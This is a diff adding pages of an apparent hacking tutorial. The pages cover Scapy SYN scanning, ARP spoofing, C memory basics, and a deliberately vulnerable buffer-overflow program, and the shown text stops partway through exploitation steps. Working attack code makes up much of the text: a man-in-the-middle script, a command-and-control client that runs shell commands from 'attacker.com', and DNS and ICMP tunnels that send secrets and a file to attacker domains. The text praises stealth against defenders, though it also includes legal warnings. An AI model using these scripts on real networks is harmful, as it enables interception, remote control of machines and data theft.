+            <p><strong>What's happening:</strong></p>
+            <ul>
+                <li><span class="inline-code">IP(dst="192.168.1.1")</span> - Create IP header with destination</li>
+                <li><span class="inline-code">TCP(dport=80, flags="S")</span> - Create TCP header with SYN flag</li>
+                <li><span class="inline-code">/</span> - Stack layers (IP contains TCP)</li>
+                <li><span class="inline-code">sr1()</span> - Send packet, receive one response</li>
+            </ul>
+
+            <p>You just manually performed a TCP SYN scan. Nmap does this at scale with optimizations, but conceptually, it's the same. You're crafting packets manually instead of relying on the OS.</p>
+
+            <h4>The Legendary SYN Scan - Stealth Port Scanning</h4>
+            <div class="code">from scapy.all import *
+
+def syn_scan(target, ports):
+    """
+    SYN scan: Send SYN, if we get SYN-ACK back, port is open.
+    We don't complete the handshake (no ACK), making it stealthier.
+    """
+    open_ports = []
+    
+    for port in ports:
+        # Craft SYN packet
+        pkt = IP(dst=target)/TCP(dport=port, flags="S")
+        
+        # Send and wait for response
+        response = sr1(pkt, timeout=1, verbose=0)
+        
+        if response and response.haslayer(TCP):
+            # If SYN-ACK, port is open
+            if response[TCP].flags == 0x12:  # SYN-ACK
+                open_ports.append(port)
+                print(f"[+] Port {port} is OPEN")
+                
+                # Send RST to close connection (stealth)
+                rst = IP(dst=target)/TCP(dport=port, flags="R")
+                send(rst, verbose=0)
+            # If RST, port is closed
+            elif response[TCP].flags == 0x14:  # RST-ACK
+                print(f"[-] Port {port} is CLOSED")
+    
+    return open_ports
+
+# Scan common ports
+target = "192.168.1.1"
+ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 8080]
+open_ports = syn_scan(target, ports)
+
+print(f"\n[*] Open ports: {open_ports}")</div>
+
+            <p>This is a production-quality stealth scanner in 30 lines. It's how Nmap's <span class="inline-code">-sS</span> flag works. You never complete the TCP handshake, making you harder to log, harder to detect.</p>
+
+            <div class="info-box">
+                <h4>Why SYN Scans Matter</h4>
+                <p><strong>Full TCP Connect:</strong> Complete 3-way handshake, get logged by target, leave traces in firewall logs.</p>
+                <p><strong>SYN Scan:</strong> Never complete handshake, often not logged by applications, bypasses some IDS/IPS.</p>
+                <p>The difference is stealth. In a red team engagement, stealth = survival. Get detected and the blue team shuts you down. Stay stealthy and you maintain access for weeks.</p>
+            </div>
+
+            <h4>ARP Spoofing - Man-in-the-Middle Attack</h4>
+            <div class="code">from scapy.all import *
+import time
+
+def get_mac(ip):
+    """Get MAC address for IP using ARP"""
+    arp = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    response = srp(broadcast/arp, timeout=2, verbose=False)[0]
+    return response[0][1].hwsrc if response else None
+
+def arp_spoof(target_ip, gateway_ip):
+    """
+    Poison ARP cache to intercept traffic between target and gateway.
+    Target thinks we are the gateway.
+    Gateway thinks we are the target.
+    All traffic flows through us.
+    """
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    
+    if not target_mac or not gateway_mac:
+        print("[-] Could not resolve MAC addresses")
+        return
+    
+    print(f"[*] Starting ARP spoofing")
+    print(f"[*] Target: {target_ip} ({target_mac})")
+    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
+    
+    try:
+        while True:
+            # Tell target we are the gateway
+            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=gateway_ip), verbose=False)
+            
+            # Tell gateway we are the target  
+            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                    psrc=target_ip), verbose=False)
+            
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[*] Restoring ARP tables...")
+        # Restore correct ARP mappings
+        send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
+
+# Execute (ONLY ON AUTHORIZED NETWORKS)
+target = "192.168.1.100"  # Victim
+gateway = "192.168.1.1"   # Router
+arp_spoof(target, gateway)</div>
+
+            <p>This script makes you the man-in-the-middle. All traffic between the target and the internet flows through your machine. You can:</p>
+            <ul>
+                <li>Sniff all unencrypted traffic (HTTP, FTP, Telnet)</li>
+                <li>Inject malicious content into HTTP responses</li>
+                <li>Hijack sessions by stealing cookies</li>
+                <li>Modify data in transit</li>
+                <li>Capture credentials from login forms</li>
+            </ul>
+
+            <div class="warning-box">
+                <h4>⚠️ Extreme Legal Risk</h4>
+                <p>ARP spoofing is <strong>highly illegal</strong> on networks you don't own. This is active interception of communications, which is a federal wiretapping offense. Penalties:</p>
+                <ul>
+                    <li>Up to 5 years for first offense</li>
+                    <li>Up to 10 years for subsequent offenses</li>
+                    <li>Fines up to $250,000</li>
+                    <li>Can trigger additional charges: identity theft, fraud, espionage</li>
+                </ul>
+                <p><strong>Only use this:</strong></p>
+                <ul>
+                    <li>On your own isolated lab network</li>
+                    <li>In authorized penetration tests with signed contracts</li>
+                    <li>On CTF/training platforms designed for this</li>
+                </ul>
+            </div>
+
+            <h3>Building Custom Protocols</h3>
+            <p>Sometimes you need to implement protocols that don't have libraries. Or you need covert communication that doesn't look like standard protocols. Let's build a simple command & control (C2) protocol.</p>
+
+            <h4>Custom C2 Protocol - Client</h4>
+            <div class="code">import socket
+import json
+import subprocess
+
+class C2Client:
+    def __init__(self, server_ip, server_port):
+        self.server = (server_ip, server_port)
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    def connect(self):
+        """Connect to C2 server"""
+        try:
+            self.sock.connect(self.server)
+            # Send beacon with system info
+            import platform
+            beacon = {
+                "type": "beacon",
+                "hostname": platform.node(),
+                "os": platform.system(),
+                "arch": platform.machine()
+            }
+            self.send_message(beacon)
+            return True
+        except Exception as e:
+            return False
+    
+    def send_message(self, data):
+        """Send JSON message with length prefix"""
+        message = json.dumps(data).encode()
+        length = len(message).to_bytes(4, 'big')
+        self.sock.sendall(length + message)
+    
+    def recv_message(self):
+        """Receive JSON message with length prefix"""
+        length_data = self.sock.recv(4)
+        if not length_data:
+            return None
+        length = int.from_bytes(length_data, 'big')
+        
+        data = b''
+        while len(data) < length:
+            chunk = self.sock.recv(length - len(data))
+            if not chunk:
+                return None
+            data += chunk
+        
+        return json.loads(data.decode())
+    
+    def execute_command(self, cmd):
+        """Execute shell command"""
+        try:
+            output = subprocess.check_output(cmd, shell=True,
+                                           stderr=subprocess.STDOUT)
+            return output.decode()
+        except subprocess.CalledProcessError as e:
+            return f"Error: {e.output.decode()}"
+    
+    def run(self):
+        """Main command loop"""
+        while True:
+            message = self.recv_message()
+            if not message:
+                break
+            
+            if message["type"] == "execute":
+                cmd = message["command"]
+                output = self.execute_command(cmd)
+                self.send_message({
+                    "type": "result",
+                    "output": output
+                })
+            elif message["type"] == "exit":
+                break
+
+# Usage
+client = C2Client("attacker.com", 4444)
+if client.connect():
+    client.run()</div>
+
+            <p>This is enterprise-grade malware design:</p>
+            <ul>
+                <li><strong>Length-prefixed messages:</strong> Prevents buffer confusion</li>
+                <li><strong>JSON protocol:</strong> Easy to extend with new commands</li>
+                <li><strong>Beacon system:</strong> Server knows what system is compromised</li>
+                <li><strong>Structured responses:</strong> Clean data handling on server side</li>
+            </ul>
+
+            <p>Real APT groups use protocols exactly like this (plus encryption, obfuscation, anti-forensics). You just learned the architecture of nation-state malware.</p>
+
+            <div class="metaphor-box">
+                <h4>Protocols as Languages</h4>
+                <p>HTTP is English - everyone speaks it, tons of resources, highly standardized. Custom protocols are like constructed languages (Klingon, Elvish) - only you and your recipient understand them.</p>
+                <p>When you need to hide in plain sight, speak English (use HTTP/HTTPS tunneling). When you need absolute control and stealth, speak your own language (custom protocol). Advanced attackers do both - custom protocol wrapped in HTTP to bypass firewalls.</p>
+            </div>
+
+            <h3>Covert Channels and Data Exfiltration</h3>
+            <p>You've compromised a target behind a strict firewall. Only DNS and NTP are allowed out. How do you exfiltrate data? Covert channels.</p>
+
+            <h4>DNS Tunneling - Exfiltration Over DNS Queries</h4>
+            <div class="code">from scapy.all import *
+import base64
+
+def exfiltrate_via_dns(data, domain):
+    """
+    Encode data in DNS queries to bypass firewall.
+    Data gets encoded in subdomain names.
+    """
+    # Encode data to base64 (DNS-safe)
+    encoded = base64.b64encode(data.encode()).decode()
+    
+    # Split into chunks (DNS labels max 63 chars)
+    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
+    
+    for i, chunk in enumerate(chunks):
+        # Build DNS query: chunk.sequence.attacker-domain.com
+        query = f"{chunk}.{i}.{domain}"
+        
+        # Send DNS query
+        pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname=query))
+        send(pkt, verbose=False)
+        
+        print(f"[+] Sent chunk {i+1}/{len(chunks)}")
+
+# Exfiltrate sensitive data
+secret = "admin:SuperSecretPassword123!"
+exfiltrate_via_dns(secret, "attacker-controlled-domain.com")</div>
+
+            <p>On your attacker-controlled DNS server, you capture these queries and reassemble the data. The firewall sees "normal" DNS traffic. But you're actually streaming data out.</p>
+
+            <p><strong>Real-world examples:</strong></p>
+            <ul>
+                <li>APT29 (Russian intelligence) used DNS tunneling to exfiltrate data from US government networks</li>
+                <li>DNSMessenger malware used DNS TXT records for command & control</li>
+                <li>OilRig group (Iranian) exfiltrated gigabytes via DNS over months</li>
+            </ul>
+
+            <h4>ICMP Tunneling - Data in Ping Packets</h4>
+            <div class="code">from scapy.all import *
+
+def send_data_via_icmp(data, target):
+    """
+    Hide data in ICMP echo request payload.
+    Looks like ping, actually exfiltrates data.
+    """
+    # Split data into 32-byte chunks
+    chunks = [data[i:i+32] for i in range(0, len(data), 32)]
+    
+    for i, chunk in enumerate(chunks):
+        # Build ICMP packet with data payload
+        pkt = IP(dst=target)/ICMP()/Raw(load=chunk.encode())
+        send(pkt, verbose=False)
+        print(f"[+] Sent chunk {i+1}/{len(chunks)} via ICMP")
+
+# Exfiltrate file
+with open("secrets.txt", "r") as f:
+    data = f.read()
+
+send_data_via_icmp(data, "attacker-server.com")</div>
+
+            <p>Firewalls often allow ICMP for network diagnostics. Attacker runs a listener that captures these ping packets and extracts the payload. Data exfiltrated, firewall none the wiser.</p>
+
+            <div class="info-box">
+                <h4>The Covert Channel Arsenal</h4>
+                <p>Advanced attackers have many covert channels:</p>
+                <ul>
+                    <li><strong>DNS:</strong> Queries, TXT records, responses</li>
+                    <li><strong>ICMP:</strong> Ping data, timestamp requests</li>
+                    <li><strong>HTTP Headers:</strong> Custom fields, cookies</li>
+                    <li><strong>NTP:</strong> Timestamp fields</li>
+                    <li><strong>Steganography:</strong> Data hidden in images uploaded to social media</li>
+                    <li><strong>Blockchain:</strong> Data encoded in Bitcoin transactions</li>
+                </ul>
+                <p>If a protocol is allowed outbound, it can be weaponized for exfiltration. Blue teamers struggle because monitoring every covert channel is nearly impossible.</p>
+            </div>
+
+            <h3>Performance and Optimization</h3>
+            <p>Network code must be fast. Slow scanners get detected. Slow exploits give defenders time to respond. Let's optimize.</p>
+
+            <h4>Asynchronous Networking with AsyncIO</h4>
+            <div class="code">import asyncio
+
+async def scan_port(ip, port):
+    """Asynchronous port check"""
+    try:
+        reader, writer = await asyncio.wait_for(
+            asyncio.open_connection(ip, port), timeout=1)
+        writer.close()
+        await writer.wait_closed()
+        return port, True
+    except:
+        return port, False
+
+async def scan_range(ip, ports):
+    """Scan multiple ports simultaneously"""
+    tasks = [scan_port(ip, port) for port in ports]
+    results = await asyncio.gather(*tasks)
+    
+    open_ports = [port for port, is_open in results if is_open]
+    return open_ports
+
+# Scan 1000 ports in seconds
+ports = range(1, 1001)
+open_ports = asyncio.run(scan_range("192.168.1.1", ports))
+print(f"[*] Open ports: {open_ports}")</div>
+
+            <p>This scans 1000 ports nearly simultaneously. Traditional sequential scanning would take 1000 seconds (with 1-second timeouts). Asyncio completes in ~1 second. That's a 1000x speed improvement.</p>
+
+            <div class="metaphor-box">
+                <h4>Threading vs Async vs Multiprocessing</h4>
+                <p><strong>Threading:</strong> Multiple workers, but Python's GIL limits true parallelism. Good for I/O-bound tasks (network).</p>
+                <p><strong>Async:</strong> Single-threaded but handles thousands of I/O operations concurrently. Best for network scanning.</p>
+                <p><strong>Multiprocessing:</strong> True parallelism, uses multiple CPU cores. Best for CPU-intensive tasks (cracking, fuzzing).</p>
+                <p>For network hacking, async is king. For password cracking, multiprocessing dominates. Know when to use each.</p>
+            </div>
+        </section>
+
+        <section class="section" id="c-fundamentals">
+            <h2 class="section-title">C Programming Fundamentals - The Language of Exploitation</h2>
+            <p class="section-intro">C is the backbone of modern computing. Linux kernel? C. Windows core? C. Networking stack? C. Every vulnerability you exploit likely exists in C code. To find them, to exploit them, to truly understand systems - you must master C.</p>
+
+            <p>Python lets you script quickly. C lets you touch memory directly. There's no abstraction, no safety nets, no garbage collection. Just you, the processor, and raw bytes. This is where hackers become dangerous.</p>
+
+            <div class="metaphor-box">
+                <h4>C is Manual Transmission</h4>
+                <p>Python is an automatic car - easy to drive, handles complexity for you, prevents many mistakes. C is a manual transmission race car - harder to drive, but gives you complete control over every aspect of performance.</p>
+                <p>Most drivers prefer automatic. But professional racers need manual to extract maximum performance and control. Similarly, most programmers prefer Python. But professional exploit developers need C to extract maximum control and understand vulnerabilities.</p>
+            </div>
+
+            <h3>Why C Dominates Systems Programming</h3>
+            <p>Over 50 years old, yet C remains irreplaceable. Why?</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>⚡ Performance</h4>
+                    <p>C compiles to machine code directly. No interpreter, no virtual machine, no overhead. When you write <span class="inline-code">a + b</span>, the CPU executes a single ADD instruction.</p>
+                    <p><strong>Hacker Benefit:</strong> Exploits must run fast, especially when racing against timeouts or detection systems.</p>
+                </div>
+                <div class="card">
+                    <h4>🎯 Memory Control</h4>
+                    <p>Direct access to pointers, manual memory allocation, ability to read/write any address. You control EXACTLY what happens in RAM.</p>
+                    <p><strong>Hacker Benefit:</strong> Understanding memory is understanding vulnerabilities. Buffer overflows, heap corruption, stack smashing - all C concepts.</p>
+                </div>
+                <div class="card">
+                    <h4>📏 Minimal Abstraction</h4>
+                    <p>C doesn't hide how computers work. Arrays are just pointers. Strings are character arrays. Functions are memory addresses.</p>
+                    <p><strong>Hacker Benefit:</strong> When you reverse engineer binaries, you're essentially reading compiled C. No abstraction means nothing is hidden.</p>
+                </div>
+                <div class="card">
+                    <h4>🌍 Universal</h4>
+                    <p>Every OS has a C compiler. Every platform runs C code. It's the universal language of systems.</p>
+                    <p><strong>Hacker Benefit:</strong> Exploits written in C work on any target. Cross-platform shellcode, portable backdoors, universal tools.</p>
+                </div>
+            </div>
+
+            <h3>The Memory Model - Where C Gets Dangerous</h3>
+            <p>In Python, you write <span class="inline-code">x = 10</span> and Python handles memory. In C, you need to understand WHERE that 10 is stored, HOW it's stored, and WHO else can access it.</p>
+
+            <h4>Memory Segments</h4>
+            <p>Every C program's memory is divided into regions:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Segment</th>
+                        <th>Purpose</th>
+                        <th>Exploitation Angle</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Text</strong></td>
+                        <td>Program code (instructions)</td>
+                        <td>Usually read-only, but if writable → code injection attacks</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Data</strong></td>
+                        <td>Initialized global variables</td>
+                        <td>Overwriting globals can change program behavior</td>
+                    </tr>
+                    <tr>
+                        <td><strong>BSS</strong></td>
+                        <td>Uninitialized global variables</td>
+                        <td>Often zero-initialized, predictable for some attacks</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Heap</strong></td>
+                        <td>Dynamic allocation (malloc/free)</td>
+                        <td>Use-after-free, heap overflow, double-free attacks</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stack</strong></td>
+                        <td>Local variables, function calls</td>
+                        <td>Buffer overflows, return address overwriting, ROP chains</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>The stack is where most beginner exploits live. Let's dive deep.</p>
+
+            <h4>The Stack - Your Exploitation Playground</h4>
+            <p>The stack stores function calls and local variables. It grows downward (from high addresses to low). Each function call creates a "stack frame":</p>
+
+            <div class="code">Function call happens:
+1. Arguments pushed onto stack
+2. Return address pushed (where to return after function)
+3. Old base pointer saved
+4. Local variables allocated
+5. Function executes
+6. Local variables destroyed
+7. Base pointer restored
+8. Return address popped
+9. Control jumps back to caller
+
+Stack frame layout (grows downward →):
+┌───────────────┐  ← High addresses
+│   Arguments   │
+├───────────────┤
+│ Return Addr   │  ← THIS is what we target
+├───────────────┤
+│   Old RBP     │
+├───────────────┤
+│ Local Var 1   │
+├───────────────┤
+│ Local Var 2   │
+├───────────────┤
+│    buffer     │  ← Overflow starts here
+└───────────────┘  ← Low addresses (stack grows down)</div>
+
+            <p>See that return address? If we overflow a buffer, we can overwrite it. When the function returns, instead of going back to the legitimate caller, it jumps to OUR address. Game over - we control execution.</p>
+
+            <h3>Pointers - The Source of Power and Vulnerabilities</h3>
+            <p>Pointers are variables that store memory addresses. They're why C is powerful and why C is dangerous.</p>
+
+            <h4>Basic Pointer Syntax</h4>
+            <div class="code">#include <stdio.h>
+
+int main() {
+    int x = 42;
+    int *ptr = &x;  // ptr stores the ADDRESS of x
+    
+    printf("Value of x: %d\n", x);          // 42
+    printf("Address of x: %p\n", &x);       // 0x7fff1234abcd
+    printf("Value of ptr: %p\n", ptr);      // 0x7fff1234abcd (same)
+    printf("Dereferenced ptr: %d\n", *ptr); // 42
+    
+    // Modify x through pointer
+    *ptr = 100;
+    printf("New value of x: %d\n", x);      // 100
+    
+    return 0;
+}</div>
+
+            <p><strong>Key concepts:</strong></p>
+            <ul>
+                <li><span class="inline-code">&x</span> = "address of x" (the memory location)</li>
+                <li><span class="inline-code">int *ptr</span> = "ptr is a pointer to an integer"</li>
+                <li><span class="inline-code">*ptr</span> = "dereference ptr" (access the value at that address)</li>
+            </ul>
+
+            <h4>Pointer Arithmetic - Walking Through Memory</h4>
+            <div class="code">#include <stdio.h>
+
+int main() {
+    int arr[5] = {10, 20, 30, 40, 50};
+    int *ptr = arr;  // Array name is a pointer to first element
+    
+    printf("arr[0]: %d\n", *ptr);       // 10
+    printf("arr[1]: %d\n", *(ptr + 1)); // 20
+    printf("arr[2]: %d\n", *(ptr + 2)); // 30
+    
+    // ptr + 1 doesn't add 1 byte, it adds sizeof(int) bytes!
+    // If int is 4 bytes, ptr + 1 adds 4 to the address
+    
+    for (int i = 0; i < 5; i++) {
+        printf("Address: %p, Value: %d\n", ptr + i, *(ptr + i));
+    }
+    
+    return 0;
+}</div>
+
+            <p><strong>Why this matters for hacking:</strong> When you exploit a buffer overflow, you're doing pointer arithmetic. You calculate: "I need to write X bytes to reach the return address, then overwrite it with this shellcode address."</p>
+
+            <h4>Dangerous Pointer Patterns</h4>
+            <div class="code">// NULL Pointer Dereference
+int *ptr = NULL;
+*ptr = 42;  // CRASH - dereferencing NULL
+
+// Wild Pointer (uninitialized)
+int *ptr;
+*ptr = 42;  // UNDEFINED - ptr contains garbage address
+
+// Dangling Pointer (pointer to freed memory)
+int *ptr = malloc(sizeof(int));
+free(ptr);
+*ptr = 42;  // VULNERABILITY - use-after-free
+
+// Buffer Overflow via Pointer
+char buffer[10];
+char *ptr = buffer;
+for (int i = 0; i < 20; i++) {
+    ptr[i] = 'A';  // OVERFLOW - writing past buffer end
+}</div>
+
+            <p>Every single one of these patterns has been exploited in real-world attacks. Understanding them makes you dangerous - you can spot vulnerabilities in source code instantly.</p>
+
+            <h3>Manual Memory Management - Where Bugs Live</h3>
+            <p>Python handles memory automatically. C makes YOU do it. With great power comes great responsibility - and great vulnerabilities.</p>
+
+            <h4>Dynamic Allocation with malloc/free</h4>
+            <div class="code">#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+    // Allocate 100 bytes on heap
+    char *buffer = malloc(100);
+    if (buffer == NULL) {
+        fprintf(stderr, "Allocation failed\n");
+        return 1;
+    }
+    
+    // Use the buffer
+    strcpy(buffer, "Hello, heap!");
+    printf("%s\n", buffer);
+    
+    // MUST free when done
+    free(buffer);
+    
+    // buffer is now dangling - don't use it!
+    // buffer = NULL;  // Good practice to NULL it
+    
+    return 0;
+}</div>
+
+            <p><strong>Common memory bugs:</strong></p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Bug</th>
+                        <th>Description</th>
+                        <th>Exploitation Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Memory Leak</strong></td>
+                        <td>malloc() without free()</td>
+                        <td>DoS (denial of service) - exhaust memory</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Double Free</strong></td>
+                        <td>free() same pointer twice</td>
+                        <td>Heap corruption, potential code execution</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Use After Free</strong></td>
+                        <td>Using pointer after free()</td>
+                        <td>Read/write freed memory, often RCE</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Heap Overflow</strong></td>
+                        <td>Write past allocated size</td>
+                        <td>Corrupt adjacent heap chunks, RCE</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="info-box">
+                <h4>Real-World Example: Heartbleed (CVE-2014-0160)</h4>
+                <p>One of the most famous vulnerabilities ever. OpenSSL had a buffer over-read bug:</p>
+                <div class="code">// Simplified Heartbleed concept
+memcpy(output, input, user_supplied_length);
+// If user_supplied_length > actual input size,
+// memcpy reads beyond buffer, leaking memory!</div>
+                <p>Attackers could read up to 64KB of server memory per request, potentially exposing:</p>
+                <ul>
+                    <li>Private SSL keys</li>
+                    <li>User passwords and session cookies</li>
+                    <li>Confidential data being processed</li>
+                </ul>
+                <p>All because of a simple memory handling bug in C. This affected 17% of all HTTPS servers worldwide.</p>
+            </div>
+
+            <h3>Compilation Process - From Code to Binary</h3>
+            <p>Understanding compilation helps you exploit binaries. When you reverse engineer, you're undoing this process.</p>
+
+            <h4>The Four Stages of Compilation</h4>
+            <div class="code"># 1. Preprocessing - Handle #include, #define, #ifdef
+gcc -E program.c -o program.i
+
+# 2. Compilation - Convert C to assembly
+gcc -S program.i -o program.s
+
+# 3. Assembly - Convert assembly to machine code
+gcc -c program.s -o program.o
+
+# 4. Linking - Combine object files and libraries
+gcc program.o -o program
+
+# Or do it all at once:
+gcc program.c -o program</div>
+
+            <h4>GCC Flags for Hacking</h4>
+            <p>When practicing exploitation, you need to disable security features:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Effect</th>
+                        <th>Why Hackers Use It</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-fno-stack-protector</span></td>
+                        <td>Disable stack canaries</td>
+                        <td>Makes buffer overflows easier to exploit</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-z execstack</span></td>
+                        <td>Make stack executable</td>
+                        <td>Allows running shellcode on stack</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-no-pie</span></td>
+                        <td>Disable ASLR</td>
+                        <td>Addresses are predictable</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-g</span></td>
+                        <td>Include debug symbols</td>
+                        <td>Makes reverse engineering easier</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-static</span></td>
+                        <td>Static linking</td>
+                        <td>All functions in one binary</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>Real-world targets have ALL security features enabled. But when learning, you disable them one by one to understand each protection mechanism.</p>
+
+            <div class="metaphor-box">
+                <h4>Learning to Exploit is Like Learning to Pick Locks</h4>
+                <p>First, you practice on locks with no pins (all protections disabled). Then add one pin (stack canaries). Then another (ASLR). Then another (DEP). Each layer makes exploitation harder.</p>
+                <p>Professional exploiters can bypass all modern protections - but they started by mastering basics on unprotected binaries. Don't rush. Master each concept fully before adding complexity.</p>
+            </div>
+
+            <h3>Writing Vulnerable Code for Practice</h3>
+            <p>To learn exploitation, you need vulnerable targets. Let's write intentionally buggy programs:</p>
+
+            <h4>Simple Buffer Overflow</h4>
+            <div class="code">// vuln1.c - Classic stack buffer overflow
+#include <stdio.h>
+#include <string.h>
+
+void secret_function() {
+    printf("🎉 You exploited the buffer overflow!\n");
+}
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // NO BOUNDS CHECKING
+    printf("You entered: %s\n", buffer);
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return 1;
+    }
+    
+    printf("secret_function is at: %p\n", secret_function);
+    vulnerable_function(argv[1]);
+    printf("Returned safely.\n");
+    return 0;
+}
+
+// Compile: gcc vuln1.c -o vuln1 -fno-stack-protector -no-pie
+// Exploit: ./vuln1 $(python3 -c 'print("A"*72 + "\x??\x??\x??\x??")')</div>
+
+            <p>This program:</p>
+            <ul>
+                <li>Has a 64-byte buffer</li>
+                <li>Uses dangerous <span class="inline-code">strcpy()</span> with no length check</li>
+                <li>If input > 64 bytes, it overwrites return address</li>
+                <li>Has a "secret_function" that's never called normally</li>
+                <li>Goal: Overflow buffer, overwrite return address to point to secret_function</li>
+            </ul>
+
+            <p>This is your first real exploit target. In the GDB section, we'll exploit this step-by-step.</p>
+        </section>
+
+        <!-- ============================================================ -->
+        <!-- SECTION: C FOR EXPLOITATION -->
+        <!-- ============================================================ -->
+        <section class="section" id="c-exploitation">
+            <h2 class="section-title">C for Exploitation</h2>
+            <p class="section-intro">Understanding C vulnerabilities is the foundation of binary exploitation. Every buffer overflow, format string bug, and memory corruption vulnerability exists because C gives you complete control - and complete responsibility. Let's learn how to weaponize C's dangerous features.</p>
+
+            <div class="metaphor-box">
+                <h4>🎯 The Knife Analogy</h4>
+                <p>C is like a chef's knife - incredibly powerful in skilled hands, but dangerous if misused. Modern languages like Python are like safety scissors - they protect you from cutting yourself, but they also limit what you can do. C gives you the raw blade, and it's your job to wield it responsibly... or exploit it when others don't.</p>
+                <p>When developers make mistakes with C, they create vulnerabilities that let attackers take complete control of the system. Your job is to understand these mistakes so deeply that you can spot them instantly and craft exploits.</p>
+            </div>
+
+            <h3>Buffer Overflows: The Classic Vulnerability</h3>
+            <p>Buffer overflows are the most famous class of vulnerabilities in computer security. They've been around since the 1970s, yet they still plague software today. Understanding them is non-negotiable for any serious hacker.</p>
+
+            <h4>How Memory Works (Simplified)</h4>
+            <p>When a program runs, memory is organized into regions:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Memory Region</th>
+                        <th>Purpose</th>
+                        <th>Exploitation Relevance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Stack</strong></td>
+                        <td>Local variables, function parameters, return addresses</td>
+                        <td>Buffer overflows overwrite return addresses here</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Heap</strong></td>
+                        <td>Dynamic memory (malloc/free)</td>
+                        <td>Heap corruption, use-after-free vulnerabilities</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Data</strong></td>
+                        <td>Global and static variables</td>
+                        <td>Can overwrite function pointers, configs</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Code</strong></td>
+                        <td>Executable program instructions</td>
+                        <td>Target for code injection (if writable)</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h4>The Stack in Detail</h4>
+            <p>The stack is where most beginner exploitation happens. Here's what a function call looks like in memory:</p>
+
+            <div class="code">// Function call: vulnerable_function("AAAABBBB")
+
+STACK LAYOUT (grows downward):
+┌─────────────────────────────────┐ ← Higher addresses
+│  Previous stack frame           │
+├─────────────────────────────────┤
+│  Saved Return Address (RIP)     │ ← Where to go after function returns
+├─────────────────────────────────┤
+│  Saved Base Pointer (RBP)       │ ← Previous stack frame pointer
+├─────────────────────────────────┤
+│  Local variable: buffer[64]     │ ← Our 64-byte buffer starts here
+│  (64 bytes)                     │
+├─────────────────────────────────┤
+│  Other local variables          │
+└─────────────────────────────────┘ ← Lower addresses (stack pointer)
+
+NORMAL CASE:
+buffer[64] = "AAAABBBB\0"
+→ Data stays within buffer bounds
+→ Return address unchanged
+→ Function returns safely
+
+OVERFLOW CASE:
+buffer[64] = "A" * 72 + "\xef\xbe\xad\xde"
+→ First 64 bytes fill buffer
+→ Next 8 bytes overwrite saved RBP
+→ Next 4-8 bytes overwrite return address
+→ Function "returns" to attacker-controlled address!</div>
+
+            <h4>Exploiting a Stack Buffer Overflow</h4>
+            <p>Let's exploit the vulnerable program from the previous section:</p>
+
+            <div class="code">// vuln1.c - Our vulnerable target
+#include <stdio.h>
+#include <string.h>
+
+void secret_function() {
+    printf("🎉 You exploited the buffer overflow!\n");
+}
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Dangerous!
+    printf("You entered: %s\n", buffer);
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return 1;
+    }
+    
+    printf("secret_function is at: %p\n", secret_function);
+    vulnerable_function(argv[1]);
+    printf("Returned safely.\n");
+    return 0;
+}
+
+// EXPLOITATION STEPS:
+
+// 1. Compile with protections OFF
+gcc vuln1.c -o vuln1 -fno-stack-protector -no-pie -z execstack
+
+// 2. Run to find secret_function address
+./vuln1 AAA
+# Output: secret_function is at: 0x401142
+
+// 3. Find the offset to return address
+# We need to find how many bytes until we overwrite RIP
+# Method: Create pattern and crash analysis (we'll use GDB for this)
+
+// 4. Craft exploit payload
+# Format: [PADDING] + [SAVED RBP] + [RETURN ADDRESS]
+# In this case: 64 bytes buffer + 8 bytes RBP + 8 bytes RIP (64-bit)
+
+// 5. Execute exploit
